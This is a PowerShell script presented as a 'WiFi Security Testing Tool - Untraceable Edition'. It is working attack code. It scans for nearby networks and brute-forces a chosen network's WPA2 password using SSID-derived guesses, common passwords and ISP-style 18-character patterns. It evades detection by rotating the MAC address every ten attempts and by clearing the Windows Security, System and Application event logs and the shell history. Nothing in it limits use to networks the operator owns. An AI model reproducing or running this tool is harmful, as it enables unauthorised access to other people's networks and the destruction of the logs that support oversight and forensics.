<#
.SYNOPSIS
    WiFi Security Testing Tool - Untraceable Edition
    
.DESCRIPTION
    Professional WiFi security testing tool with maximum security.
    Supports: Windows, Ubuntu, Debian, RedHat, macOS, Linux
#>

[CmdletBinding()]
param(
    [ValidateSet("standard", "stealth", "aggressive", "ghost")]
    [string]$Mode = "ghost",
    
    [int]$HexPasswordCount = 5000
)

# Force error handling
$ErrorActionPreference = "Stop"
$ProgressPreference = "Continue"

# ============================================
# OS DETECTION
# ============================================

$Global:OS_TYPE = "Unknown"
$Global:OS_NAME = "Unknown"

function Initialize-OSDetection {
    if ($env:OS -eq "Windows_NT" -or $IsWindows) {
        $Global:OS_TYPE = "Windows"
        $Global:OS_NAME = "Windows"
        $Global:OS_VERSION = [System.Environment]::OSVersion.VersionString
        
        if ([System.Environment]::OSVersion.Version.Major -eq 10) {
            if ([System.Environment]::OSVersion.Version.Build -ge 22000) {
                $Global:OS_NAME = "Windows 11"
            } else {
                $Global:OS_NAME = "Windows 10"
            }
        }
        return
    }
    
    if ($IsLinux -or $PSVersionTable.Platform -eq "Unix") {
        $Global:OS_TYPE = "Linux"
        
        if (Test-Path "/etc/os-release") {
            $osInfo = @{}
            Get-Content "/etc/os-release" | ForEach-Object {
                if ($_ -match '^(.*?)=(.*)$') {
                    $key = $matches[1]
                    $value = $matches[2] -replace '"', ''
                    $osInfo[$key] = $value
                }
            }
            
            $Global:OS_NAME = $osInfo["NAME"]
            if ($Global:OS_NAME -match "Ubuntu") { $Global:OS_NAME = "Ubuntu" }
            elseif ($Global:OS_NAME -match "Debian") { $Global:OS_NAME = "Debian" }
            elseif ($Global:OS_NAME -match "Red Hat|RHEL") { $Global:OS_NAME = "RedHat" }
            elseif ($Global:OS_NAME -match "CentOS") { $Global:OS_NAME = "CentOS" }
            elseif ($Global:OS_NAME -match "Fedora") { $Global:OS_NAME = "Fedora" }
            elseif ($Global:OS_NAME -match "Kali") { $Global:OS_NAME = "Kali" }
            else { $Global:OS_NAME = "Linux" }
        }
        return
    }
    
    if ($IsMacOS) {
        $Global:OS_TYPE = "macOS"
        $Global:OS_NAME = "macOS"
        return
    }
}

Initialize-OSDetection

# ============================================
# CONFIGURATION
# ============================================

$Global:Config = @{
    Mode = $Mode
    GhostMode = ($Mode -eq "ghost")
    StealthMode = ($Mode -eq "stealth" -or $Mode -eq "ghost")
    Interface = $null
    OriginalMac = $null
    SessionKey = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]$_})
}

# ============================================
# UTILITY FUNCTIONS
# ============================================

function Clear-SystemTraces {
    try {
        if ($Global:OS_TYPE -eq "Windows") {
            wevtutil cl Security 2>$null
            wevtutil cl System 2>$null
            wevtutil cl Application 2>$null
            ipconfig /flushdns | Out-Null
            Clear-History 2>$null
        } 
        elseif ($Global:OS_TYPE -eq "Linux" -or $Global:OS_TYPE -eq "macOS") {
            Remove-Item ~/.bash_history -Force -ErrorAction SilentlyContinue 2>$null
            history -c 2>$null
        }
    } catch {}
}

function Get-NetworkAdapters {
    $adapters = @()
    
    try {
        if ($Global:OS_TYPE -eq "Windows") {
            Write-Host "[DEBUG] Detecting Windows adapters..." -ForegroundColor Gray
            
            $netAdapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { 
                $_.MediaType -eq "Native 802.11" -or 
                $_.MediaType -eq "802.11" -or
                $_.InterfaceDescription -match "wireless|wifi|wi-fi|wlan"
            }
            
            Write-Host "[DEBUG] Found $($netAdapters.Count) potential adapters" -ForegroundColor Gray
            
            foreach ($adapter in $netAdapters) {
                $adapters += [PSCustomObject]@{
                    Name = $adapter.Name
                    Description = $adapter.InterfaceDescription
                    Status = $adapter.Status
                    MacAddress = $adapter.MacAddress
                    GUID = $adapter.InterfaceGuid
                }
            }
        }
        elseif ($Global:OS_TYPE -eq "Linux") {
            $interfaces = iw dev 2>$null | Select-String "Interface" | ForEach-Object { 
                ($_ -split "\s+")[1] 
            }
            
            if (-not $interfaces) {
                $interfaces = iwconfig 2>$null | Select-String "IEEE 802.11" | ForEach-Object { 
                    ($_ -split "\s+")[0] 
                }
            }
            
            foreach ($iface in $interfaces) {
                $mac = ""
                try { $mac = (cat "/sys/class/net/$iface/address" 2>$null).Trim() } catch {}
                
                $adapters += [PSCustomObject]@{
                    Name = $iface
                    Description = "Wireless Interface"
                    Status = "Unknown"
                    MacAddress = $mac
                    GUID = $iface
                }
            }
        }
        elseif ($Global:OS_TYPE -eq "macOS") {
            $airport = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
            if (Test-Path $airport) {
                $adapters += [PSCustomObject]@{
                    Name = "en0"
                    Description = "Wi-Fi"
                    Status = "Unknown"
                    MacAddress = "Unknown"
                    GUID = "en0"
                }
            }
        }
    }
    catch {
        Write-Host "[ERROR] Adapter detection failed: $_" -ForegroundColor Red
    }
    
    return $adapters
}

function Set-RandomMac {
    param([string]$Interface)
    
    try {
        $random = Get-Random
        $bytes = [byte[]]::new(6)
        (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
        $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
        $newMac = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
        
        if ($Global:OS_TYPE -eq "Windows") {
            Disable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
            $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue | Where-Object { 
                $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
                $props -and $props.NetCfgInstanceId -eq (Get-NetAdapter -Name $Interface).InterfaceGuid 
            }
            
            if ($subKeys) {
                $targetKey = if ($subKeys -is [array]) { $subKeys[0].PSPath } else { $subKeys.PSPath }
                Set-ItemProperty -Path $targetKey -Name "NetworkAddress" -Value $newMac.Replace(":", "") -Force -ErrorAction SilentlyContinue
            }
            
            Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 3
            return $true
        }
        elseif ($Global:OS_TYPE -eq "Linux") {
            sudo ip link set $Interface down 2>$null
            Start-Sleep -Seconds 1
            sudo ip link set $Interface address $newMac 2>$null
            sudo ip link set $Interface up 2>$null
            Start-Sleep -Seconds 2
            return $true
        }
    }
    catch {
        return $false
    }
}

function Get-WifiNetworks {
    $networks = [System.Collections.Generic.List[hashtable]]::new()
    
    try {
        if ($Global:OS_TYPE -eq "Windows") {
            # Force scan
            for ($i = 0; $i -lt 2; $i++) {
                netsh wlan scan interface="$($Global:Config.Interface)" 2>&1 | Out-Null
                Start-Sleep -Seconds 2
            }
            
            $output = netsh wlan show networks interface="$($Global:Config.Interface)" mode=Bssid 2>&1
            
            $current = $null
            foreach ($line in $output) {
                $trimmed = $line.Trim()
                if ([string]::IsNullOrWhiteSpace($trimmed)) { continue }
                
                if ($trimmed -match "^SSID\s+\d+\s*:\s*(.+)$") {
                    if ($current -and $current.SSID) { 
                        [void]$networks.Add($current) 
                    }
                    
                    $current = @{
                        SSID = $matches[1].Trim() -replace '[\x00-\x1F\x7F]', ''
                        Security = "Unknown"
                        Signal = 0
                    }
                }
                elseif ($current) {
                    if ($trimmed -match "Authentication\s*:\s*(.+)") {
                        $current.Security = $matches[1].Trim()
                    }
                    elseif ($trimmed -match "Signal\s*:\s*(\d+)") {
                        $current.Signal = [int]$matches[1].Trim()
                    }
                }
            }
            
            if ($current -and $current.SSID) { 
                [void]$networks.Add($current) 
            }
        }
        elseif ($Global:OS_TYPE -eq "Linux") {
            $iface = $Global:Config.Interface
            $scan = sudo iw dev $iface scan 2>$null | Out-String
            
            if (-not $scan) {
                $scan = sudo iwlist $iface scan 2>$null | Out-String
            }
            
            if ($scan) {
                $cells = $scan -split "(?=(BSS|Cell) [0-9a-f]{2}:)"
                foreach ($cell in $cells) {
                    if ($cell -match "SSID:\s*(.+)") {
                        $ssid = $matches[1].Trim()
                        if ([string]::IsNullOrWhiteSpace($ssid) -or $ssid -eq "\x00") { continue }
                        
                        $signal = 0
                        if ($cell -match "signal:\s*(-?\d+)") {
                            $signal = [Math]::Min(100, [Math]::Max(0, 2 * ([int]$matches[1] + 100)))
                        }
                        
                        $sec = "Open"
                        if ($cell -match "RSN") { $sec = "WPA2" }
                        elseif ($cell -match "WPA") { $sec = "WPA" }
                        
                        [void]$networks.Add(@{
                            SSID = $ssid
                            Security = $sec
                            Signal = $signal
                        })
                    }
                }
            }
        }
    }
    catch {}
    
    return @($networks | Where-Object { $_.Signal -ge 1 } | Sort-Object -Property Signal -Descending)
}

function Test-Password {
    param([string]$SSID, [string]$Password, [string]$Interface)
    
    try {
        if ($Global:OS_TYPE -eq "Windows") {
            $profileName = "T_$(Get-Random)"
            
            $xml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$profileName</name>
    <SSIDConfig><SSID><name>$([Security.SecurityElement]::Escape($SSID))</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$([Security.SecurityElement]::Escape($Password))</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"@
            
            $tempFile = [System.IO.Path]::GetTempFileName()
            $xml | Out-File -FilePath $tempFile -Encoding UTF8
            
            netsh wlan add profile filename="$tempFile" interface="$Interface" | Out-Null
            netsh wlan connect name="$profileName" interface="$Interface" | Out-Null
            
            Start-Sleep -Milliseconds 2500
            
            $info = netsh wlan show interfaces interface="$Interface" | Out-String
            $success = ($info -match "State\s+:\s+connected" -and $info -match "SSID\s+:\s+$([regex]::Escape($SSID))")
            
            netsh wlan delete profile name="$profileName" | Out-Null
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            
            return $success
        }
        elseif ($Global:OS_TYPE -eq "Linux") {
            $connName = "temp_$(Get-Random)"
            sudo nmcli connection add type wifi con-name $connName ifname $Interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $Password 2>&1 | Out-Null
            sudo nmcli connection up $connName 2>&1 | Out-Null
            Start-Sleep -Milliseconds 2000
            
            $active = sudo nmcli connection show --active | Select-String $connName
            sudo nmcli connection delete $connName 2>&1 | Out-Null
            
            return ($active -ne $null)
        }
        
        return $false
    }
    catch {
        return $false
    }
}

# ============================================
# PASSWORD GENERATION
# ============================================

function Get-SSIDPasswords {
    param([string]$SSID)
    
    $passwords = @()
    if ([string]::IsNullOrWhiteSpace($SSID)) { return $passwords }
    
    $clean = $SSID.Trim()
    $lower = $clean.ToLower()
    $words = $clean -split '[-_\s]+'
    $first = $words[0]
    
    $patterns = @(
        $clean, $lower, "$clean`123", "$clean`1234", "$clean`2024",
        "$lower`123", "$lower`1234", "$lower`2024", "$first`123",
        "$first`1234", "$first`2024", "$first`wifi", "$first`password",
        "wifi$clean", "$clean`wifi", "$clean`password", "$clean`admin",
        "$clean-123", "$clean-2024", "$clean_123", "$first-123",
        "$first-2024", "$clean`01", "$clean`001", "$clean`999",
        "$first`123456", "$first`password", "$first`qwerty", "$first`abc123"
    )
    
    foreach ($p in $patterns) {
        if ($p.Length -ge 8 -and $p.Length -le 63 -and $p -notin $passwords) {
            $passwords += $p
        }
    }
    
    return $passwords
}

function Get-CommonPasswords {
    return @(
        "12345678", "123456789", "1234567890", "password", "password123",
        "qwerty123", "abc12345", "letmein1", "welcome1", "monkey123",
        "dragon123", "master123", "sunshine", "princess", "admin1234",
        "login1234", "welcome123", "password1", "1234qwer", "qwertyuiop",
        "123456789a", "super123", "hello123", "freedom1", "whatever",
        "qazwsx123", "trustno1", "baseball", "football", "iloveyou",
        "computer", "starwars", "pokemon1", "hello1234", "adminadmin",
        "admin12345", "useruser12", "support123", "default1", "guest1234",
        "wireless", "wireless123", "wifi12345", "internet1", "broadband",
        "home1234", "mywifi123", "network1", "connect1", "online123",
        "11111111", "22222222", "33333333", "44444444", "55555555",
        "66666666", "77777777", "88888888", "99999999", "00000000",
        "12121212", "12312312", "11223344", "98765432", "87654321",
        "qwerty12", "asdfgh12", "zxcvbn12", "1q2w3e4r", "qazwsx12",
        "20242024", "20232023", "20222022", "password12", "password13",
        "secret1234", "mypassword", "default123", "changeme1", "home12345",
        "house123", "office12", "work1234", "family123", "love1234",
        "internet12", "tech1234", "digital1", "smart123", "phone123",
        "password123456", "123456789012", "qwerty123456", "letmein12345",
        "welcome12345", "monkey123456", "dragon123456", "master123456",
        "sunshine1234", "princess1234", "football12", "baseball12",
        "iloveyou1234", "trustno123", "whatever123", "password1234",
        "1234password", "mypassword123", "welcome1234", "password!",
        "P@ssw0rd", "P@ssw0rd123", "Pass1234", "Password1", "Admin123",
        "root1234", "toor1234", "guest123", "user1234", "test1234",
        "demo1234", "temp1234", "pass1234", "key12345", "access12"
    ) | Select-Object -Unique
}

function Get-18CharPatterns {
    $patterns = @()
    
    # Orange/Vodacom patterns
    $prefixes = @("2TFG", "2TFH", "2TFJ", "3AFG", "2UFG", "A4B8", "001F", "0024")
    $middles = @("3AQ7", "3AR7", "3BQ7", "4AQ7", "3AP7", "3AQ8")
    $centers = @("2NZH", "2NZJ", "2NYH", "3NZH", "2NZG", "2MZH")
    $suffixes = @("5CCAGX", "5CCAGY", "5CDAGX", "5CCAHX", "5CCAGZ", "5DCAGX")
    
    foreach ($pre in $prefixes) {
        foreach ($mid in $middles) {
            foreach ($cen in $centers) {
                foreach ($suf in $suffixes) {
                    $pass = "$pre$mid$cen$suf"
                    if ($pass -notin $patterns) {
                        $patterns += $pass
                    }
                }
            }
        }
    }
    
    # Random hex
    $hex = "0123456789ABCDEF"
    for ($i = 0; $i -lt 1000; $i++) {
        $pass = -join ((1..18) | ForEach-Object { $hex[(Get-Random -Maximum 16)] })
        if ($pass -notin $patterns) {
            $patterns += $pass
        }
    }
    
    return $patterns
}

# ============================================
# MAIN
# ============================================

function Start-Test {
    try {
        Clear-SystemTraces
        
        # Header - ASCII only
        Write-Host ""
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host "    WiFi Security Testing Tool - Untraceable Edition" -ForegroundColor Cyan
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host "  OS: $($Global:OS_NAME)" -ForegroundColor White
        Write-Host "  Mode: $($Global:Config.Mode)" -ForegroundColor White
        Write-Host "===============================================================" -ForegroundColor Cyan
        Write-Host ""
        
        # Admin check
        $isAdmin = $false
        if ($Global:OS_TYPE -eq "Windows") {
            $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
            $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
            $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        } else {
            $isAdmin = ((id -u) -eq 0)
        }
        
        if (-not $isAdmin) {
            Write-Host "[ERROR] Administrator/root rights required" -ForegroundColor Red
            return
        }
        
        # Get adapters
        Write-Host "[INFO] Detecting network adapters..." -ForegroundColor Yellow
        $adapters = Get-NetworkAdapters
        
        Write-Host "[DEBUG] Found $($adapters.Count) adapters" -ForegroundColor Gray
        
        if ($adapters.Count -eq 0) {
            Write-Host "[ERROR] No wireless adapters found" -ForegroundColor Red
            Write-Host "[INFO] Make sure WiFi is enabled and drivers are installed" -ForegroundColor Yellow
            return
        }
        
        Write-Host "`n[ADAPTERS] Available wireless adapters:" -ForegroundColor Cyan
        for ($i = 0; $i -lt $adapters.Count; $i++) {
            $statusColor = if ($adapters[$i].Status -eq "Up") { "Green" } else { "Yellow" }
            Write-Host "  [$i] $($adapters[$i].Name)" -ForegroundColor White -NoNewline
            Write-Host " - $($adapters[$i].Description) " -NoNewline
            Write-Host "[$($adapters[$i].Status)]" -ForegroundColor $statusColor
        }
        
        # Selection with validation
        $validSelection = $false
        $selectedIndex = -1
        
        do {
            $sel = Read-Host "`nSelect adapter number (0-$($adapters.Count - 1))"
            
            # Validate input is a number
            if ($sel -match '^\d+$') {
                $selectedIndex = [int]$sel
                if ($selectedIndex -ge 0 -and $selectedIndex -lt $adapters.Count) {
                    $validSelection = $true
                } else {
                    Write-Host "[ERROR] Number out of range. Please enter 0-$($adapters.Count - 1)" -ForegroundColor Red
                }
            } else {
                Write-Host "[ERROR] Invalid input. Please enter a number." -ForegroundColor Red
            }
        } while (-not $validSelection)
        
        $adapter = $adapters[$selectedIndex]
        $Global:Config.Interface = $adapter.Name
        $Global:Config.OriginalMac = $adapter.MacAddress
        
        Write-Host "`n[SELECTED] $($adapter.Name)" -ForegroundColor Green
        
        # Change MAC
        Write-Host "`n[ANON] Changing MAC address..." -ForegroundColor Cyan
        if (Set-RandomMac -Interface $adapter.Name) {
            Write-Host "  [OK] MAC changed successfully" -ForegroundColor Green
        } else {
            Write-Host "  [WARN] MAC change failed, continuing with original..." -ForegroundColor Yellow
        }
        
        # Scan
        Write-Host "`n[SCAN] Scanning for WiFi networks..." -ForegroundColor Yellow
        $networks = Get-WifiNetworks
        
        if ($networks.Count -eq 0) {
            Write-Host "[ERROR] No networks found. Make sure WiFi is enabled." -ForegroundColor Red
            return
        }
        
        Write-Host "`n[NETWORKS] Found $($networks.Count) networks:" -ForegroundColor Green
        for ($i = 0; $i -lt $networks.Count; $i++) {
            $signalColor = if ($networks[$i].Signal -ge 70) { "Green" } elseif ($networks[$i].Signal -ge 40) { "Yellow" } else { "Red" }
            Write-Host "  [$i] " -NoNewline
            Write-Host "$($networks[$i].SSID)" -ForegroundColor White -NoNewline
            Write-Host " (Signal: " -NoNewline
            Write-Host "$($networks[$i].Signal)%" -ForegroundColor $signalColor -NoNewline
            Write-Host ", Security: $($networks[$i].Security))"
        }
        
        # Target selection with validation
        $validTarget = $false
        $targetIndex = -1
        
        do {
            $sel = Read-Host "`nSelect target network (0-$($networks.Count - 1))"
            
            if ($sel -match '^\d+$') {
                $targetIndex = [int]$sel
                if ($targetIndex -ge 0 -and $targetIndex -lt $networks.Count) {
                    $validTarget = $true
                } else {
                    Write-Host "[ERROR] Number out of range" -ForegroundColor Red
                }
            } else {
                Write-Host "[ERROR] Invalid input. Please enter a number." -ForegroundColor Red
            }
        } while (-not $validTarget)
        
        $target = $networks[$targetIndex]
        Write-Host "`n[TARGET] $($target.SSID)" -ForegroundColor Cyan
        
        # Generate passwords
        Write-Host "`n[GENERATING] Creating password lists..." -ForegroundColor Yellow
        
        Write-Host "  [1/3] SSID-based passwords..." -ForegroundColor Gray
        $p1 = Get-SSIDPasswords -SSID $target.SSID
        
        Write-Host "  [2/3] Common world passwords..." -ForegroundColor Gray
        $p2 = Get-CommonPasswords
        
        Write-Host "  [3/3] 18-character patterns..." -ForegroundColor Gray
        $p3 = Get-18CharPatterns
        
        # Combine
        $allPasswords = @()
        $allPasswords += $p1
        $allPasswords += $p2 | Where-Object { $_ -notin $allPasswords }
        $allPasswords += $p3 | Where-Object { $_ -notin $allPasswords }
        
        Write-Host "`n[READY] Total unique passwords: $($allPasswords.Count)" -ForegroundColor Green
        Write-Host "[INFO] Order: 1) SSID-based, 2) Common, 3) 18-char patterns" -ForegroundColor Gray
        Write-Host "[INFO] Press 'Q' to stop, 'R' to rotate MAC`n" -ForegroundColor Yellow
        
        # Test loop
        $startTime = Get-Date
        $tested = 0
        $phase = "PHASE 1/3"
        $phaseName = "SSID-BASED"
        
        for ($i = 0; $i -lt $allPasswords.Count; $i++) {
            $password = $allPasswords[$i]
            $tested++
            
            # Determine phase
            if ($i -eq $p1.Count) { 
                $phase = "PHASE 2/3"
                $phaseName = "COMMON"
                Write-Host "`n[$phase] Testing common world passwords..." -ForegroundColor Cyan
            }
            elseif ($i -eq ($p1.Count + $p2.Count)) {
                $phase = "PHASE 3/3"
                $phaseName = "18CHAR-PATTERN"
                Write-Host "`n[$phase] Testing 18-character patterns..." -ForegroundColor Cyan
            }
            
            # Progress
            if ($i % 5 -eq 0 -or $i -eq 0) {
                $percent = [math]::Min(($i / $allPasswords.Count) * 100, 100)
                Write-Progress -Activity "[$phaseName] Testing passwords" -Status $password -PercentComplete $percent
            }
            
            # Key check
            if ([Console]::KeyAvailable) {
                $key = [Console]::ReadKey($true)
                if ($key.Key -eq 'Q') { 
                    Write-Host "`n[STOP] User interrupted testing" -ForegroundColor Yellow
                    break 
                }
                if ($key.Key -eq 'R') {
                    Write-Host "`n[ANON] Rotating MAC address..." -ForegroundColor Cyan
                    Set-RandomMac -Interface $Global:Config.Interface | Out-Null
                }
            }
            
            # Rotate MAC every 10 in ghost mode
            if ($Global:Config.GhostMode -and ($tested % 10 -eq 0) -and ($tested -gt 0)) {
                Set-RandomMac -Interface $Global:Config.Interface | Out-Null
            }
            
            # Test
            $success = Test-Password -SSID $target.SSID -Password $password -Interface $Global:Config.Interface
            
            if ($success) {
                $elapsed = (Get-Date) - $startTime
                
                Write-Host "`n`n[SUCCESS] ==========================================" -ForegroundColor Green
                Write-Host "  PASSWORD FOUND!" -ForegroundColor Green
                Write-Host "  SSID: $($target.SSID)" -ForegroundColor White
                Write-Host "  Password: $password" -ForegroundColor Green
                Write-Host "  Phase: $phaseName" -ForegroundColor Cyan
                Write-Host "  Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Gray
                Write-Host "  Tested: $tested of $($allPasswords.Count)" -ForegroundColor Gray
                Write-Host "========================================== [SUCCESS]" -ForegroundColor Green
                
                # Cleanup
                Clear-SystemTraces
                Set-RandomMac -Interface $Global:Config.Interface | Out-Null
                
                return
            }
        }
        
        # Not found
        Write-Host "`n[RESULT] Password not found" -ForegroundColor Red
        Write-Host "  Total tested: $($allPasswords.Count) passwords" -ForegroundColor Gray
        
        # Cleanup
        Clear-SystemTraces
        Set-RandomMac -Interface $Global:Config.Interface | Out-Null
        
    }
    catch {
        Write-Host "`n[ERROR] $_" -ForegroundColor Red
        Write-Host $_.ScriptStackTrace -ForegroundColor Gray
    }
    finally {
        # Emergency cleanup
        Clear-SystemTraces
        if ($Global:Config.Interface) {
            Set-RandomMac -Interface $Global:Config.Interface | Out-Null
        }
        
        Write-Host "`n[DONE] Press any key to exit..." -ForegroundColor Cyan
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
}

# Set priority and start
try {
    $proc = Get-Process -Id $PID
    $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
} catch {}

Start-Test